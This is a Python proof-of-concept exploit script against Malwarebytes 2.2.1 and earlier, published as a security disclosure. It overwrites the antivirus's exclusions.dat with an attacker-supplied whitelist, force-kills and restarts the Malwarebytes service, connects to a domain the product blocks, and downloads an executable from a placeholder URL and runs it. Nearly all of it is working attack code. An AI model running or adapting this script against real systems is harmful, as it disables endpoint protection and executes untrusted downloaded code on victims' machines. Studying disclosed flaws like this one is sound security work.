"""Malwarebytes permission proof of concept.

Proof-of-concept script to take demonstrate incorrect permissions and hardcoded
asymmetric encryption in Malwarebytes 2.2.1 and prior.  Fixed in 3.0.4.
Provide your own exclusions.dat

By Michael Spaling - provided as-is.  Use at your own risk.
http://www.securitytube.net/video/16690
"""

import os
import shutil
import socket
import subprocess
import time
import urllib

import win32serviceutil

BLACKLISTED_SITE_HOST = "image6.putlocker.is"
BLACKLISTED_SITE_PORT = 80
BLACKLISTED_FILE_URL = "http://YOURURLHERE/7ZipSetup.exe"
BLACKLISTED_FILE_PATH = "C:\\7ZipSetup.exe"


def main():
    """Main app along with user prompt to move through the steps."""
    input("Press enter to deliver the exploit")
    _copy_malicious_exclusions()
    _restart_malware_process()

    input("Press enter to initiate a malicious TCP connection")
    _show_blacklisted_site()

    input(
        "Press enter to download and run malware.  \
        Malware will open outside this window."
    )
    _run_blacklisted_file()

    input("Press enter to exit this program")


def _copy_malicious_exclusions():
    """Overwrites a valid version of exclusions.dat.

    We override with a malicious version of exclusions.dat that whitelists 7ZipSetup.exe
    and image6.putlocker.is both of which where blocked by Malwarebytes at the time of
    disclosure.
    """
    shutil.copy(
        "exclusions.dat",
        "C:\\ProgramData\\Malwarebytes\\Malwarebytes Anti-Malware\\exclusions.dat",
    )


def _restart_malware_process():
    """Restarts malware processes to force new whitelist to take affect."""
    os.system("taskkill /f /im mbam.exe")
    servicename = "MBAMService"
    subprocess.call(f'taskkill /f /fi "services eq {servicename}"')
    time.sleep(5)
    win32serviceutil.StartService(servicename)


def _show_blacklisted_site():
    """Initiates TPC connection on provided host and port

    This domain is blacklisted by Malwarebytes Web Protect but will now be accessible.
    We connect a client to root index of blacklisted url
    and record data that is received up to a maximum of 4096 bytes.
    """
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((BLACKLISTED_SITE_HOST, BLACKLISTED_SITE_PORT))
    client.send(f"GET / HTTP/1.1\r\n{BLACKLISTED_SITE_HOST}\r\n\r\n")
    response = client.recv(4096)
    print(response)


def _run_blacklisted_file():
    """Downloads a file from a webserver and saves in a file path.

    Then run the file.
    This file is blacklisted by Malwarebytes Malware Protect but will now be executed.
    """
    urllib.urlretrieve(BLACKLISTED_FILE_URL, BLACKLISTED_FILE_PATH)
    os.system(BLACKLISTED_FILE_PATH)


if __name__ == "__main__":
    main()
